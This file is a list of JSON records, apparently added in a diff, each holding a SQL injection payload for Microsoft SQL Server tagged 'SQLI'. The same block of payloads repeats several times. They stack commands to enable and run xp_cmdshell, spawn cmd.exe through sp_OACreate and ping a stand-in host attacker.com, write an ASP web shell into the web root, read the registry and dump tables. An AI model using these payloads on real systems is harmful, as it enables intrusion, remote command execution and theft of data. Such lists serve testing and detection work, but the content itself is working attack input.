+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
